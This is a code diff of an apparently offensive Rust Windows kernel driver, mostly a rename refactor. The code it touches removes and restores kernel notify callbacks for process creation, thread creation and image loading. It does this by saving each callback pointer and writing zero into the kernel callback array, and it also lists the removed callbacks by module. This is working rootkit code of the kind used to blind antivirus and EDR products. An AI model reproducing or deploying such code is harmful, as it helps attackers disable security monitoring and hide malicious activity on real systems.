@@ -10,7 +10,7 @@ use {
             find_callback::{find_callback_address, CallbackResult}, 
             CallbackList, INFO_CALLBACK_RESTAURE
         }, 
-        includes::structs::CallbackRestaure, utils::return_module
+        internals::structs::CallbackRestaure, utils::return_module
     },
 };
 
@@ -20,21 +20,21 @@ pub struct Callback;
 /// Implement a feature for the callback PsSetCreateProcessNotifyRoutine / PsSetCreateThreadNotifyRoutine / PsSetLoadImageNotifyRoutine.
 impl CallbackList for Callback {
     unsafe fn restore_callback(target_callback: *mut CallbackInfoInput) -> NTSTATUS {
-        let mut callback_info = INFO_CALLBACK_RESTAURE.lock();
-        let callback_type = (*target_callback).callback;
+        let mut callbacks = INFO_CALLBACK_RESTAURE.lock();
+        let type_ = (*target_callback).callback;
         let index = (*target_callback).index;
 
-        if let Some(index) = callback_info.iter().position(|c| c.callback == callback_type && c.index == index) {
+        if let Some(index) = callbacks.iter().position(|c| c.callback == type_ && c.index == index) {
             let address = match find_callback_address(&(*target_callback).callback) {
                 Some(CallbackResult::PsCreate(addr)) => addr,
                 _ => return STATUS_UNSUCCESSFUL,
             };
 
-            let addr = address.offset((callback_info[index].index * 8) as isize);
-            *(addr as *mut u64) = callback_info[index].address;
-            callback_info.remove(index);
+            let addr = address.offset((callbacks[index].index * 8) as isize);
+            *(addr as *mut u64) = callbacks[index].address;
+            callbacks.remove(index);
         } else {
-            log::error!("Callback not found for type {:?} at index {}", callback_type, index);
+            log::error!("Callback not found for type {:?} at index {}", type_, index);
             return STATUS_UNSUCCESSFUL;
         }
 
@@ -49,7 +49,7 @@ impl CallbackList for Callback {
 
         let index = (*target_callback).index as isize;
         let addr = address.offset(index * 8);
-        let callback_restaure = CallbackRestaure {
+        let callback = CallbackRestaure {
             index: (*target_callback).index,
             callback: (*target_callback).callback,
             address: *(addr as *mut u64),
@@ -57,7 +57,7 @@ impl CallbackList for Callback {
         };
 
         let mut callback_info = INFO_CALLBACK_RESTAURE.lock();
-        callback_info.push(callback_restaure);
+        callback_info.push(callback);
 
         *(addr as *mut u64) = 0;
 
@@ -122,12 +122,11 @@ impl CallbackList for Callback {
     }
     
     unsafe fn enumerate_removed_callback(target_callback: *mut CallbackInfoInput, callback_info: *mut CallbackInfoOutput, information: &mut usize) -> Result<(), NTSTATUS> {
-        let callback_restaure = INFO_CALLBACK_RESTAURE.lock();
-
+        let callbacks = INFO_CALLBACK_RESTAURE.lock();
         let (mut ldr_data, module_count) = return_module().ok_or(STATUS_UNSUCCESSFUL)?;
         let start_entry = ldr_data;
 
-        for (i, callback) in callback_restaure.iter().enumerate() {
+        for (i, callback) in callbacks.iter().enumerate() {
             for _ in 0..module_count {
                 let start_address = (*ldr_data).DllBase;
                 let image_size = (*ldr_data).SizeOfImage;
